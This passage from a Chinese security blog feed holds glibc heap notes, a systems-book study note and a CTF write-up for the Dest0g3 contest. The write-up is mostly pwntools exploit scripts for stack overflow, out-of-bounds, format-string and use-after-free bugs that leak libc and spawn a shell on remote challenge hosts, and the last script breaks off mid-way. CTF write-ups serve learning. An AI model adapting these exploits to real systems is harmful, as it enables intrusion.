功能是 如果*fb等于old2，则将*fb存储为p，返回old2；</span><br>    <span class="hljs-comment">// *fb=p 也就是 让对应fastbin的fd指向 p(新加入的堆块)</span><br><br>    <span class="hljs-comment">//检查fastbin中对应的bin的第一项的大小是否与p(要添加的块)的大小相同。</span><br>    <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>      &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果size大于max_fast，其余部分size的chunk会先放入unsorted_bin，等下次遍历unsorted_bin时，再放入相应大小的bin中。</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>程序员的自我修养chapter1</title>
    <link href="/2022/06/24/%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BBchapter1/"/>
    <url>/2022/06/24/%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BBchapter1/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><p>计算机的硬件最为核心的三部分是：CPU,内存和I&#x2F;O控制芯片</p></li><li><p>早期计算机由于需求不高，所以CPU和内存以及各种外设都是连接在一条总线上的，后来由于CPU的核心频率提升，导致内存已经无法跟上CPU的速度了，所以出现了包含南北桥的芯片，北桥处理高速设备和CPU，南桥处理低速设备。</p></li><li><p>计算机发展到一定程度后，摩尔定律就不再适用，那是因为在制造CPU方面已经达到了人类的物理极限，在频率上CPU短期内是没有提高空间了，基本都在4Ghz以下，所以人们采用了多核CPU来提高上线，也就是__SMP（多核多处理器）__。</p></li><li><p>这里引用一句话“计算机科学领域的任何问题都可以通过增加一个间接的中间层来解决”。计算机中的每个层次都需要通信，既然通信那就必然要存在一个通信协议，我们一般将其称之为接口。</p></li><li><p>CPU的资源十分昂贵，那么我们要做的当然就是不能让CPU闲着，从多道程序到分时系统再到多任务系统，都是人们压榨CPU的方法的升级。</p></li><li><p>不同的计算机硬件是有可能不同的，如果程序员们，要针对不同计算机的硬件来进行编程，那么程序员的应该会成为稀缺物种吧，这是我们不希望看到的，所以针对不同的硬件，一般开发商都会为其生产的硬件提供驱动程序，操作系统的开发者为硬件生产的开发商提供了一些接口和框架，这样这个问题就迎刃而解了</p></li><li><p>内存不够怎么办？我们现在面临了三个问腿，程序运行地址空间不隔离，内存使用效率低，程序运行的地址不确定。这时候我们的内存分页机制就完美的解决了这一问题。通过分页，我们将物理内存和虚拟内存分成若干个4kb大小的页 ，同时通过MMU来实现虚拟内存和物理内存的映射。</p></li><li><p>线程部分，这部分理解的不太好，还需要再读读。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>程序员的自我修养</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Dest0g3迎新赛wp及其复现</title>
    <link href="/2022/05/24/destdog/"/>
    <url>/2022/05/24/destdog/</url>
    
    <content type="html"><![CDATA[<h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>由于这段时间比较忙，本人并未做全部题目，只写了部分，后面的题目有时间会补上的</p><h2 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h2><p>一道arm栈溢出，存在后门：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28172</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Please leave your name:&#x27;</span>)<br>p.timeout = <span class="hljs-number">0.5</span><br>pl1 = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span>) + <span class="hljs-string">b&#x27;\x3c&#x27;</span><br>p.send(pl1)<br>p.interactive()<br>pwn()<br></code></pre></td></tr></table></figure><h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><p>存在数组越界漏洞，覆盖栈上数字下标变量即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br><span class="hljs-comment"># r = process(&quot;./ez_pwn&quot;)</span><br>r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27674</span>)<br>e = ELF(<span class="hljs-string">&quot;./ez_pwn&quot;</span>)<br>libc = e.libc<br><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.slafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims    :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(ru(data)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(ru(data)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info_base = <span class="hljs-keyword">lambda</span> tag, base        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(base))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">cmd</span>):<br>gdb.attach(r,cmd)<br>pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sign32</span>(<span class="hljs-params">vx</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> vx <span class="hljs-keyword">or</span> vx &lt; <span class="hljs-number">0x80000000</span>:<br>        <span class="hljs-keyword">return</span> vx<br>    <span class="hljs-keyword">return</span> vx - <span class="hljs-number">0x100000000</span><br><br>ru(<span class="hljs-string">b&#x27;input the length of array:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;-4294967297&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>ru(<span class="hljs-string">b&#x27;input your choice:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;input num&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;100&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;input your choice:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;input num&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;17&#x27;</span>)<br><br>ru(<span class="hljs-string">b&#x27;input your choice:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;input num&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;134516928&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;input your choice:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;input num&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;134517768&#x27;</span>) <br><span class="hljs-comment"># dbg(&#x27;b *0x804933D&#x27;)</span><br>ru(<span class="hljs-string">b&#x27;input your choice:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;input num&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;134529044&#x27;</span>)<br><br><span class="hljs-comment"># dbg(&#x27;b *0x804933D&#x27;)</span><br>ru(<span class="hljs-string">b&#x27;input your choice:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;100&#x27;</span>)<br>addr = uu32(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr))<br><br><br><br><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,addr)<br>base = addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br>sys = base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>sh = base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>sys = get_sign32(sys)<br>sh = get_sign32(sh)<br><br>ru(<span class="hljs-string">b&#x27;input the length of array:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;-4294967297&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>ru(<span class="hljs-string">b&#x27;input your choice:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;input num&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;100&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;input your choice:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;input num&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;17&#x27;</span>)<br><br>ru(<span class="hljs-string">b&#x27;input your choice:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;input num&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(sys))<br><span class="hljs-built_in">print</span>(sys)<br><span class="hljs-comment"># dbg(&#x27;b *0x804933D&#x27;)</span><br><br>sl(<span class="hljs-built_in">str</span>(sys).encode())<br>ru(<span class="hljs-string">b&#x27;input your choice:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;input num&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;134517768&#x27;</span>) <br><br><br>ru(<span class="hljs-string">b&#x27;input your choice:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;input num&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(sh).encode())<br><br>ru(<span class="hljs-string">b&#x27;input your choice:&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;100&#x27;</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="dest-love"><a href="#dest-love" class="headerlink" title="dest_love"></a>dest_love</h2><p>bss段格式化字符串，这题出题人没给libc，卡了很久</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># r = process(&quot;./pwn&quot;)</span><br>r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28742</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = e.libc<br><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.slafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims    :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(ru(data)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(ru(data)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info_base = <span class="hljs-keyword">lambda</span> tag, base        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(base))<br>leak = <span class="hljs-keyword">lambda</span> name,base :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, base))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">cmd</span>):<br>gdb.attach(r,cmd)<br>pause()<br><br>ru(<span class="hljs-string">b&quot;What about your love to Dest0g3?\n&quot;</span>)<br>se(<span class="hljs-string">b&#x27;aaa&#x27;</span>)<br>ru(<span class="hljs-string">b&quot;What about your love to Dest0g3?\n&quot;</span>)<br>se(<span class="hljs-string">b&#x27;aaa&#x27;</span>)<br><br><span class="hljs-comment">#leak</span><br>ru(<span class="hljs-string">b&quot;What about your love to Dest0g3?\n&quot;</span>)<br>se(<span class="hljs-string">b&quot;%12$p%10$p&quot;</span>)<br>text_base = <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x185</span> - <span class="hljs-number">0x1000</span><br>leak(<span class="hljs-string">&quot;text_base&quot;</span>,text_base)<br>stack = <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xd8</span><br>leak(<span class="hljs-string">&quot;stack&quot;</span>,stack)<br>num = stack % <span class="hljs-number">0x10000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(num))<br><br><br>ru(<span class="hljs-string">b&quot;What about your love to Dest0g3?\n&quot;</span>)<br>pl1 = <span class="hljs-string">&quot;%&#123;num&#125;c%10$hn&quot;</span>.<span class="hljs-built_in">format</span>(num = num)<br><br>se(pl1)<br>target = text_base + <span class="hljs-number">0x4010</span><br>num2 = target % <span class="hljs-number">0x10000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(num2))<br><br>ru(<span class="hljs-string">b&quot;What about your love to Dest0g3?\n&quot;</span>)<br>pl2 = <span class="hljs-string">&quot;%&#123;num&#125;c%39$hn&quot;</span>.<span class="hljs-built_in">format</span>(num = num2)<br>se(pl2)<br><br>ru(<span class="hljs-string">b&quot;What about your love to Dest0g3?\n&quot;</span>)<br>pl3 = <span class="hljs-string">&quot;%1314520c%12$n&quot;</span><br><br>se(pl3)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h2><p>很明显的漏洞uaf,但版本是2.33，之前没做过这个版本的，所以搜索了一下相关知识，也是做出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><span class="hljs-comment"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br>local_file  = <span class="hljs-string">&#x27;./uaf&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span><br><span class="hljs-comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>e = ELF(local_file)<br>context.arch = e.arch<br><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29477</span>)<br>    libc = ELF(local_libc)<br><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.slafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims    :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(ru(data)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(ru(data)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info_base = <span class="hljs-keyword">lambda</span> tag, base        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(base))<br>leak = <span class="hljs-keyword">lambda</span> name,base :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, base))<br>gadget = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]<br>r.timeout = <span class="hljs-number">0.5</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">cmd</span>):<br>    gdb.attach(r,cmd)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,desc</span>):<br>    ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">b&#x27;Please tell me its size:&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(size).encode())<br>    ru(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>    se(desc)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,desc</span>):<br>    ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    ru(<span class="hljs-string">b&#x27;Please tell me the index:&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index).encode())<br>    ru(<span class="hljs-string">b&#x27;Please tell me its content:&#x27;</span>)<br>    se(desc)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    ru(<span class="hljs-string">b&#x27;Please tell me the index:&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    ru(<span class="hljs-string">b&#x27;Please tell me the index:&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;/bin/sh\x00\x00&#x27;</span>*<span class="hljs-number">2</span>)<br>    dele(<span class="hljs-number">0</span>)<br>    show(<span class="hljs-number">0</span>)<br>    he0=uu64(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(he0))<br>    dele(<span class="hljs-number">1</span>)<br>    show(<span class="hljs-number">1</span>)<br>    he1=u64(ru(<span class="hljs-string">b&#x27;\x00&#x27;</span>)[-<span class="hljs-number">7</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(he1))<br>    heap=he0^he1<br>    leak(<span class="hljs-string">&quot;heap&quot;</span>,heap)<br>   <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">8</span>):<br>        dele(i)<br>    show(<span class="hljs-number">5</span>)<br>    he=u64(ru(<span class="hljs-string">b&#x27;\x00&#x27;</span>)[-<span class="hljs-number">7</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(he))<br>    show(<span class="hljs-number">6</span>)<br>    he6=u64(ru(<span class="hljs-string">b&#x27;\x00&#x27;</span>)[-<span class="hljs-number">7</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(he6))<br>    show(<span class="hljs-number">7</span>)<br>    base=uu64(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)-<span class="hljs-number">0x1e0c00</span><br>    leak(<span class="hljs-string">&quot;base&quot;</span>,base)<br>    free_hook=base+libc.sym[<span class="hljs-string">&quot;__free_hook&quot;</span>]<br>    leak(<span class="hljs-string">&quot;free_hook&quot;</span>,free_hook)<br>    sys=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    leak(<span class="hljs-string">&quot;sys&quot;</span>,sys)<br><br>    add(<span class="hljs-number">128</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>    tagerheap=heap+<span class="hljs-number">0x2d0</span><br>    leak(<span class="hljs-string">&quot;target heap:&quot;</span>,tagerheap)<br>    tagerheap_key=tagerheap^he<br>    leak(<span class="hljs-string">&quot;target heap_key:&quot;</span>,tagerheap_key)<br>    